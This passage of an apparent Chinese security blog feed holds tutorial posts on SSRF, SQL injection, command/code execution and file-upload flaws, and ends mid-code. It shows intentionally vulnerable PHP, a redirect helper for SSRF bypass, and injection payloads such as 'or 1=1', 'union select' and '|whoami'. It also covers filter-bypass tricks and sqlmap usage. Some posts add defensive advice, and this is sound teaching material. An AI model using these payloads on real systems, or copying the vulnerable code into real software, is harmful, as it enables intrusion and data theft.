        <content type="html"><![CDATA[<h1 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h1><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>服务端请求伪造（Server-Side Request Forgery），是指Web服务提供从用户指定的URL读取数据并展示功能又未对用户输入的URL进行过滤，导致攻击者可借助服务端实现访问基本无权访问的URLWeblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis，fastcgi等脆弱组件。</p><h2 id="漏洞产生的原因："><a href="#漏洞产生的原因：" class="headerlink" title="漏洞产生的原因："></a>漏洞产生的原因：</h2><p>大都是由于服务端提供了从其他服务器应用获取数据的功能，但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器发起请求，并返回对该目标地址请求的数据。</p><h2 id="SSRF漏洞的危害"><a href="#SSRF漏洞的危害" class="headerlink" title="SSRF漏洞的危害"></a>SSRF漏洞的危害</h2><ul><li>对目标服务器所在的内网进行IP存活性扫描和端口扫描</li><li>利用扫描的指纹信息判断开发的服务，从而对内网的主机进行攻击</li><li>识别内网WEB应用指纹，判断应用类型进行攻击</li><li>使用特定协议攻击应用（gopher，dict,flie,FTP/SFTP）</li></ul><h3 id="数据流："><a href="#数据流：" class="headerlink" title="数据流："></a>数据流：</h3><p>攻击者—-&gt;服务器—-&gt;目标地址</p><p>根据后台使用的函数的不同，对应的影响和利用方法又有不一样。</p><h3 id="php中下面的函数使用不当会导致SSRF："><a href="#php中下面的函数使用不当会导致SSRF：" class="headerlink" title="php中下面的函数使用不当会导致SSRF："></a>php中下面的函数使用不当会导致SSRF：</h3><ol><li><code>file_get_contents()</code>这段代码使用file_get_contents函数从用户指定的url获取图片，然后把它用一个随机文件名保存在硬盘上，并展示给用户。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_POST[&#x27;url&#x27;])) </span><br><span class="line">&#123; </span><br><span class="line">$content = file_get_contents($_POST[&#x27;url&#x27;]);</span><br><span class="line">    $filename =&#x27;./images/&#x27;.rand().&#x27;;img1.jpg&#x27;;</span><br><span class="line">    file_put_contents($filename, $content); </span><br><span class="line">    echo $_POST[&#x27;url&#x27;]; </span><br><span class="line">    $img = &quot;&lt;img src=\&quot;&quot;.$filename.&quot;\&quot;/&gt;&quot;; </span><br><span class="line">    &#125;</span><br><span class="line">    echo $img;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ol start="2"><li><code>fsockopen()</code>这段代码使用fsockopen函数实现获取用户制定URL的数据（文件或者HTML），这个函数会使用socket跟服务器建立TCP连接，传输原始数据。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">function GetFile($host,$port,$link) </span><br><span class="line">&#123; </span><br><span class="line">$fp = fsockopen($host, intval($port), $errno, $errstr, 30); </span><br><span class="line">if (!$fp) </span><br><span class="line">&#123; </span><br><span class="line">echo &quot;$errstr (error number $errno) \n&quot;; </span><br><span class="line">&#125; </span><br><span class="line">else </span><br><span class="line">&#123; </span><br><span class="line">$out = &quot;GET $link HTTP/1.1\r\n&quot;; </span><br><span class="line">$out .= &quot;Host: $host\r\n&quot;; $out .= &quot;Connection: Close\r\n\r\n&quot;; </span><br><span class="line">$out .= &quot;\r\n&quot;; fwrite($fp, $out); $contents=&#x27;&#x27;; </span><br><span class="line">while (!feof($fp)) </span><br><span class="line">&#123; </span><br><span class="line">$contents.= fgets($fp, 1024); </span><br><span class="line">&#125; </span><br><span class="line">fclose($fp);</span><br><span class="line">             return $contents; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ol start="3"><li><code>curl_exec()</code>使用curl获取数据。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if (isset($_POST[&#x27;url&#x27;])) </span><br><span class="line">&#123; </span><br><span class="line">$link = $_POST[&#x27;url&#x27;]; </span><br><span class="line">$curlobj = curl_init(); </span><br><span class="line">curl_setopt($curlobj, CURLOPT_POST, 0); </span><br><span class="line">curl_setopt($curlobj,CURLOPT_URL,$link); </span><br><span class="line">curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1); </span><br><span class="line">$result=curl_exec($curlobj); </span><br><span class="line">curl_close($curlobj); </span><br><span class="line">$filename = &#x27;./curled/&#x27;.rand().&#x27;.txt&#x27;; </span><br><span class="line">file_put_contents($filename, $result); </span><br><span class="line">echo $result;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ol start="4"><li>这个不是函数，是利用SSRF进行端口扫描127.0.0.1:3306根据服务器的返回信息进行判断，大部分应用不会判别端口，可通过返回的banner信息判断端口的状态。</li></ol><p><strong>后端代码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if (isset($_POST[&#x27;url&#x27;])) </span><br><span class="line">&#123; </span><br><span class="line">$link = $_POST[&#x27;url&#x27;]; </span><br><span class="line">$filename = &#x27;./curled/&#x27;.rand().&#x27;txt&#x27;; </span><br><span class="line">$curlobj = curl_init($link); </span><br><span class="line">$fp = fopen($filename,&quot;w&quot;); </span><br><span class="line">curl_setopt($curlobj, CURLOPT_FILE, $fp); </span><br><span class="line">curl_setopt($curlobj, CURLOPT_HEADER, 0); </span><br><span class="line">curl_exec($curlobj); curl_close($curlobj); </span><br><span class="line">fclose($fp); </span><br><span class="line">$fp = fopen($filename,&quot;r&quot;);</span><br><span class="line">$result = fread($fp, filesize($filename)); </span><br><span class="line">fclose($fp); </span><br><span class="line">echo $result;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>前端代码</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;px&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.1/ss.php&quot;</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;commit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>请求非HTTP的端口可以返回banner信息。或可利用302跳转进行绕HTTP协议的限制。</p><p><strong>辅助脚本</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$ip = $_GET[&#x27;ip&#x27;];</span><br><span class="line">$port = $_GET[&#x27;port&#x27;];</span><br><span class="line">$scheme = $_GET[&#x27;s&#x27;];</span><br><span class="line">$data = $_GET[&#x27;data&#x27;];</span><br><span class="line">header(&quot;Location: $scheme://$ip:$port/$data&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>如果一定要通过后台服务器远程去对用户指定（“或者预埋在前端的请求”）的地址进行资源请求，则请做好目标地址的过滤。</p><h2 id="SSRF的漏洞攻击利用"><a href="#SSRF的漏洞攻击利用" class="headerlink" title="SSRF的漏洞攻击利用"></a>SSRF的漏洞攻击利用</h2><ol><li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务端banner信息。（banner信息中可以获取到软件开发商、软件名称、服务类型、版本号等）</li><li>攻击运行在内网或本地的应用程序（比如溢出）。</li><li>对内网Web应用进行指纹识别，通过访问默认文件实现。</li><li>攻击内外网的web应用，主要是使用get参数就可以实现的攻击。</li><li>利用file协议读取本地文件等。</li></ol><h2 id="SSRF绕过姿势"><a href="#SSRF绕过姿势" class="headerlink" title="SSRF绕过姿势"></a>SSRF绕过姿势</h2><ol><li><p><strong>更改IP地址写法。</strong>例如：192.168.0.18进制格式0300.0250.0.116进制格式：0xC0.0xA8.0.110 进制整数格式：323223552116 进制整数格式：0xC0A80001，还有一种特殊的省略模式，例如10.0.0.1这个 IP 可以写成10.12。</p></li><li><p><strong>利用 URL 解析问题</strong> 在某些情况下，后端程序可能会对访问的 URL 进行解析，对解析出来的 host 地址进行过滤。这时候可能会出现对 URL 参数解析不当，导致可以绕过过滤。</p><p>例如：<a href="http://www.baidu.com@192.168.0.1/%E4%B8%8Ehttp://192.168.0.1%E8%AF%B7%E6%B1%82%E7%9A%84%E9%83%BD%E6%98%AF192.168.0.1%E5%86%85%E5%AE%B9%E5%8F%AF%E4%BB%A5%E6%8C%87%E5%90%91%E4%BB%BB%E6%84%8F">http://www.baidu.com@192.168.0.1/与http://192.168.0.1请求的都是192.168.0.1内容可以指向任意</a> ip 的域名xip.io：<a href="http://127.0.0.1.xip.io/==&gt;http://127.0.0.1/%E7%9F%AD%E5%9C%B0%E5%9D%80http://dwz.cn/11SMa==&gt;http://127.0.0.1%E5%88%A9%E7%94%A8%E5%8F%A5%E5%8F%B7%E3%80%82%EF%BC%9A127%E3%80%820%E3%80%820%E3%80%821==&gt;127.0.0.1%E5%88%A9%E7%94%A8">http://127.0.0.1.xip.io/==&gt;http://127.0.0.1/短地址http://dwz.cn/11SMa==&gt;http://127.0.0.1利用句号。：127。0。0。1==&gt;127.0.0.1利用</a> Enclosed alphanumerics</p></li></ol><h2 id="SSRF漏洞防御"><a href="#SSRF漏洞防御" class="headerlink" title="SSRF漏洞防御"></a>SSRF漏洞防御</h2><ol><li>开启OpenSSL无法进行交互利用服务端需要鉴权不能完美利用限制请求的端口为http常用端口，比如，80,443,8080,8090.</li><li>禁用不需要的协议。</li><li>仅仅允许http和https请求。可以防止类似于 file://,gopher://,ftp:// 等引起的问题。</li><li>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入</title>
      <link href="/2021/08/22/sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/08/22/sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p><strong>原理</strong>：所谓sql注入就是通过把sql命令插入到web表单提交或输入域名或页面请求的拆线呢字符串，最终达到欺骗服务器执行指定的sql语句。具体来说，它是利用现有的应用程序，将sql语句注入到后台数据库引擎执行的能力，它可以通过在Web表单上输入sql语句得到一个存在的安全漏洞的网站上的数据，而不是按照设计者意图在执行sql语句</p><p>一、 sql注入漏洞的原理：sql注入攻击指的是通过构建特殊的输入作为参数传入web应用程序，而这些输入大都是sql语法里的一些组合，通过执行sql语句进而执行攻击者所要的操作，其主要原因就是程序根据相关技术原理，sql注入可以分为平台层注入和代码层注入。前者由于不安全的数据库配置或者数据库平台的漏洞所致；后者主要是由于程序员对输入未进行戏指地过滤，从而执行了非法的数据查询。基于此，sql注入的产生原因通常表现在以下几方面：</p><ol><li>不合理的查询集处理</li><li>不当的错误处理</li><li>转义字符处理不合适</li><li>多个提交处理不当</li></ol><p>二、sql注入漏洞的方法</p><ol><li>数字注入：</li></ol><p>在浏览器地址中输入：?id=1，这是一个get型的接口，发送这个请求相当于调用一个查询语句：</p><p><code>select * from arrticle where id =&quot;$id&quot;</code></p><p>正常情况下，应该返回一个id=1的文章。那么，如果在浏览器地址栏中输入?id=-1or1=1，这就是一个sql注入攻击了，可能会返回所有文章的信息。</p><p>这是因为，id=-1永远为false，而1=1永远是true，根据or语句，那么where的语句的条件想到与没有，那么查询的结果相当于整张表格的内容。</p><p>2.字符串注入</p><p>有这样一个用户登陆的场景:登陆界面包括用户名和密码输入框，以及提交按钮。输入用户名和密码，提交。</p><p>这是一个post的请求，登陆时调用接口learn.me/sql/login.html,首先连接数据库，然后在后台请求用户名和密码参数校验，即是一个sql的查询过程。假设正确的用户名和密码user和pwd123，输入正确的用户名和密码、提交。相当于调用了以下的sql语句。</p><p><code>SELECT *FROM user HERE username =&#39;user&#39; AND password =&#39;pwd123&#39;</code></p><p>由于用户名和密码都是字符串，sql注入方法既是参数携带的数据编程mysql中注释的字符串。mysql中有2种注释的方法</p><ul><li>‘#’：在这之后的所有字符串都会呗当成注释处理，用户名输入user’#密码任意输入，这样提交相当于</li></ul><p><code>SELECT * FROM suer WHERE username=&#39;username&#39;#&#39; AND password=&#39;&#39;</code></p><p>后面相当于注释掉了。</p><ol start="2"><li>‘__’后面的字符串也会被当成注释来处理</li></ol><h2 id="当我们遇到sql题目的时候的处理方法"><a href="#当我们遇到sql题目的时候的处理方法" class="headerlink" title="当我们遇到sql题目的时候的处理方法"></a>当我们遇到sql题目的时候的处理方法</h2><ol><li>首先先输入<code>‘ </code>进行判断是否有注入点，也可and 1=1 and 1=2   </li><li>爆破当前的数据库名：通常先用order by使用order by 语法，确定字段数。这个语句的意思是按照第n列排序，若order by 8正常，order by 9报错的话就表示原查询语句查询结果为9列。</li></ol><p><code>union select 1,2,database()#</code></p><ol start="3"><li>按照要求爆破出自己需要的</li></ol><p><img src="https://images2018.cnblogs.com/blog/1371400/201804/1371400-20180418233926050-609985087.png" alt="img"></p><p>上面为手动注入，下面可以使用工具，sqlmap</p><p>sqlmap主要是语法之间的使用</p><p>对于文件来说 -r 读取文件 -p 确定参数 –current-db 爆破出当前数据库</p><p>常见的 -u 检测是否有注入点</p><p>-d 数据库</p><p>-t 表</p><p>-c 列</p><p>–dump 爆破数据</p>]]></content>
      
      
      
        <tags>
            
            <tag> Sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCE</title>
      <link href="/2021/08/22/RCE/"/>
      <url>/2021/08/22/RCE/</url>
      
        <content type="html"><![CDATA[<h2 id="RCE远程代码-命令执行"><a href="#RCE远程代码-命令执行" class="headerlink" title="RCE远程代码/命令执行"></a>RCE远程代码/命令执行</h2><h2 id="RCE概述"><a href="#RCE概述" class="headerlink" title="RCE概述"></a>RCE概述</h2><p>RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。</p><h2 id="RCE漏洞产生的原因"><a href="#RCE漏洞产生的原因" class="headerlink" title="RCE漏洞产生的原因"></a>RCE漏洞产生的原因</h2><p>一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口，比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上。一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并且返回测试结果。如果设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台执行，从而控制整个后台服务器。</p><p><strong>具体的后端代码</strong></p><p><code>$result . =shell_exec(&#39;ping &#39; .$ip);</code>//直接将变量拼接进来，没做处理</p><p><code>if(@!eval($_POST[&#39;txt&#39;]))</code>//远程代码执行evel。</p><p>这里和上面执行ping指令不同的时，这里是php代码，而上面执行的是命令行。</p><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>Windows管道符</p><table><thead><tr><th>管理符</th><th>作用</th><th>举例</th></tr></thead><tbody><tr><td>|</td><td>直接执行后面的语句</td><td>ping 127.0.0.1|whoami</td></tr><tr><td>||</td><td>前面的语句执行出错则执行后面的语句</td><td>ping 127.0.0.1||whoami</td></tr><tr><td>&amp;</td><td>前面的语句为假则执行后面的语句</td><td>ping 127.0.0.1&amp;whoami</td></tr><tr><td>&amp;&amp;</td><td>前面的语句为假，直接出错，前面的语句为真，执行后面的语句</td><td>ping 127.0.0.1&amp;&amp;whoami</td></tr><tr><td>；</td><td>先执前面的语句后执行后面的语句</td><td>ping 127.0.0.1;whoami</td></tr></tbody></table><p>一般我们是需要用后面的语句来进行攻击，所以首选|。</p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>尽量不要使用命令执行函数</p><p>不要让用户控制参数</p><p>执行前做好检测和过滤</p><h2 id="PHP命令执行函数"><a href="#PHP命令执行函数" class="headerlink" title="PHP命令执行函数"></a>PHP命令执行函数</h2><ol><li>system():</li></ol><p>system 执行外部程序（命令行），并且显示输出</p><p>这个函数会将结果直接进行输出（注意：是直接输出区别于返回值），<strong>命令成功后返回输出的最后一行</strong>，失败返回FALSE。</p><ol start="2"><li>shell_exec()：</li></ol><p>shell_exec通过shell环境执行命令（<strong>这就意味着这个方法只能在liunx或mac os的shell环境中使用</strong>），并且完整的输出以字符串的方式返回。如果执行过程中发生错误或者进程不产生输出，则返回NULL。</p><ol start="3"><li>exec():</li></ol><p>exec执行一个外部程序</p><p>返回命令执行结果最后一行的内容。不显示回显。如果想要获取命令的输出内容，请确保使用output参数，或者利用这个函数来构建反弹shell。</p><ol start="4"><li>passthru():</li></ol><p>passthru 执行外部程序并且显示原始输出</p><ol start="5"><li>反引号</li></ol><p>反引号可以用来在php代码中直接执行系统命令，但是想要回显的话还需要一个echo：</p><ol start="6"><li>花括号</li></ol><p>{command，}</p><ol start="7"><li>echo命令</li></ol><h2 id="PHP代码执行函数"><a href="#PHP代码执行函数" class="headerlink" title="PHP代码执行函数"></a>PHP代码执行函数</h2><p>代码执行漏洞与命令执行漏洞具有相通性。</p><p>利用系统函数实现命令执行，在php下，允许命令执行的函数有：</p><p>eval（），assert（），preg_replace()、**${}**等</p><p>${}执行代码（在双引号中倘若有${}出现，那么{}内的内容将被当作php代码块来执行。）</p><h2 id="实战过滤"><a href="#实战过滤" class="headerlink" title="实战过滤"></a>实战过滤</h2><ol><li>遇到运算符过滤绕过</li></ol><p>%0a换行</p><ol start="2"><li>空格及关键词过滤绕过</li></ol><p>${IFS} 关键词中加入$* 绕过</p><ol start="3"><li>cat过滤</li></ol><p>使用双引号进行绕过</p>]]></content>
      
      
      
        <tags>
            
            <tag> Web bug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>任意文件上传</title>
      <link href="/2021/08/22/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2021/08/22/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h1><h2 id="什么是Webshell"><a href="#什么是Webshell" class="headerlink" title="什么是Webshell"></a>什么是Webshell</h2><p>顾名思义，“webshell”显然是需要服务器开放web服务取得对服务器某种程度上操作权限。</p><p><strong>原理</strong>：webshell就是以asp、php、jsp、或者cgi等网页文件形式存在的一种代码执行环境，主要用于网站管理、服务器管理、权限管理等操作。使用方法简单，秩序上传一个代码文件，通过网址访问，便可进行很多日常操作，极大地方便了使用者对网站和服务器的管理。正因如此，也有小部分人将代码修改后当作后面程序使用，以达到控制网站服务器的目的。</p><p><strong>webshell常常被称为匿名用户通过WEB服务端口对WEB服务器有某种程度上操作的权限，由于其大多是以网页脚本的形式出现，也有人称之为网站后门工具。</strong></p><h3 id="webshell有什么作用？"><a href="#webshell有什么作用？" class="headerlink" title="webshell有什么作用？"></a>webshell有什么作用？</h3><ol><li>webshell被站长常常用于网站管理、服务器管理等等，根据FSO权限（是ASP的一个对文件操作的控件，该控件可以对服务器进行读取、新建、修改、删除目录以及文件的操作）的不同，作用有在线编辑网页脚本、上传下载文件、查看数据库、执行任意程序指令。</li><li>被入侵者利用，从而达到控制网站服务器的目的。这些网页脚本常被为WEB脚本木马，目前比较流行的asp或php木马，也有基于.NET的脚本木马。</li></ol><h3 id="webshell的隐蔽性"><a href="#webshell的隐蔽性" class="headerlink" title="webshell的隐蔽性"></a>webshell的隐蔽性</h3><p> 有些恶意网页脚本可以嵌套在正常网页中运行，且不容易被查杀。webshell可以穿越服务器防火墙，由于与被控制的服务器或远程主机交换的数据都是通过80端口传递的，因此不会被防火墙拦截。并且使用webshell一般不会在系统日志中留下记录，指挥在网站的web日志留下一些数据提交记录，没有经验的管理员是很难看出入侵痕迹。</p><h3 id="如何防范恶意后面？"><a href="#如何防范恶意后面？" class="headerlink" title="如何防范恶意后面？"></a>如何防范恶意后面？</h3><p>从根本上解决动态页面脚本的安全问题，要做到防注入、防爆库、防COOKIES欺骗、防跨站脚本攻击等等，务必配置好服务器FSO权限。</p><h2 id="什么是任意文件上传及其产生原理"><a href="#什么是任意文件上传及其产生原理" class="headerlink" title="什么是任意文件上传及其产生原理"></a>什么是任意文件上传及其产生原理</h2><p>上传漏洞这个顾名思义，就是攻击者通过上传木马文件，直接得到WEBSHELL，危害等级超级高，现在的入侵中上传漏洞也是常见的漏洞。漏洞产生原理：由于程序员在对用户文件上传功能实现代码上没有严格限制用户上传的文件后缀以及文件类型或者处理缺陷，而导致用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。</p><p>简单的来说：</p><p>服务端没有对客户端上传的文件进行严格验证或过滤，用户可以上传一个可执行的脚本文件，并通过此脚本获得了执行服务端命令的能力。</p><h2 id="网站对于文件上传的几种检测方式"><a href="#网站对于文件上传的几种检测方式" class="headerlink" title="网站对于文件上传的几种检测方式"></a>网站对于文件上传的几种检测方式</h2><p> 一、 前端JavaScript检测 前端一般都是使用js来限制我们的上传类型和文件大小，这里以upload-labs Pass为例</p><p>​    <code>function checkFile() &#123;   var file = document.getElementsByName(&#39;upload_file&#39;)[0].value;   if (file == null || file == &quot;&quot;) &#123; ​    alert(&quot;请选择要上传的文件!&quot;); ​    return false;   &#125;   //定义允许上传的文件类型   var allow_ext = &quot;.jpg|.png|.gif&quot;;   //提取上传文件的类型   var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));   //判断上传文件类型是否允许上传   if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) &#123; ​    var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name; ​    alert(errMsg); ​    return false;   &#125; &#125;</code></p><p>对于前端的检测我们可以通过抓包来修改文件类型，也可以禁用掉JavaScript。总之，只有前端的限制是非常不安全的，非常容易被绕过。</p><p>二、 后端检测文件类型（MIME）</p><ol><li>检测content-type（内容类型）</li></ol><p>后端代码大致为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$allow_content_type = array(&quot;image/gif&quot;, &quot;image/png&quot;, &quot;image/jpeg&quot;);</span><br><span class="line">$path = &quot;./uploads&quot;;</span><br><span class="line">$type = $_FILES[&quot;myfile&quot;][&quot;type&quot;];if (!in_array($type, $allow_content_type)) &#123;</span><br><span class="line">    die(&quot;File type error!&lt;br&gt;&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $file = $path . &#x27;/&#x27; . $_FILES[&quot;myfile&quot;][&quot;name&quot;];</span><br><span class="line">    if (move_uploaded_file($_FILES[&quot;myfile&quot;][&quot;tmp_name&quot;], $file)) &#123;</span><br><span class="line">        echo &#x27;Success!&lt;br&gt;&#x27;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &#x27;Error!&lt;br&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>绕过方法：抓包将content-type改为图片形式（即‘image/png’等），即可成功上传</p><ol start="2"><li>检测文件头判断文件类型</li></ol><p>后端代码大致为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$allow_mime = array(&quot;image/gif&quot;, &quot;image/png&quot;, &quot;image/jpeg&quot;);</span><br><span class="line">$imageinfo = getimagesize($_FILES[&quot;myfile&quot;][&quot;tmp_name&quot;]);</span><br><span class="line">$path = &quot;./uploads&quot;;</span><br><span class="line">if (!in_array($imageinfo[&#x27;mime&#x27;], $allow_mime)) &#123;</span><br><span class="line">    die(&quot;File type error!&lt;br&gt;&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $file = $path . &#x27;/&#x27; . $_FILES[&quot;myfile&quot;][&quot;name&quot;];</span><br><span class="line">    if (move_uploaded_file($_FILES[&quot;myfile&quot;][&quot;tmp_name&quot;], $file)) &#123;</span><br><span class="line">        echo &#x27;Success!&lt;br&gt;&#x27;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &#x27;Error!&lt;br&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>此时虽然检查的也是文件类型，但是使用<code>getimagesize()</code>函数来获取文件的MIME类型，此时检测的不是数据包中<code>content-type</code>，而是图片的文件头，常见的图片文件头如下：</p><p>  gif(GIF89a) : 47 49 46 38 39 61</p><p>  jpg、jpeg : FF D8 FF</p><p>  png : 89 50 4E 47 0D 0A</p><p>绕过方法：</p><p>当上传php文件时，可以使用winhex、010editor等十六进制处理工具，在数据最前面添加图片的文件头，从而绕过检测。</p><p>三、 后端检测文件拓展名</p><ol><li>黑名单检测：</li></ol><p>后端代码大致为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// 实际情况中黑名单内数据会更多更全面</span><br><span class="line">&lt;?php</span><br><span class="line">$blacklist = array(&#x27;php&#x27;, &#x27;asp&#x27;, &#x27;aspx&#x27;, &#x27;jsp&#x27;);</span><br><span class="line">$path = &quot;./uploads&quot;;</span><br><span class="line">$type = array_pop(explode(&#x27;.&#x27;, $_FILES[&#x27;myfile&#x27;][&#x27;name&#x27;]));if (in_array(strtolower($type), $blacklist)) &#123;</span><br><span class="line">    die(&quot;File type errer!&lt;br&gt;&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $file = $path . &#x27;/&#x27; . $_FILES[&#x27;myfile&#x27;][&#x27;name&#x27;];</span><br><span class="line">    if 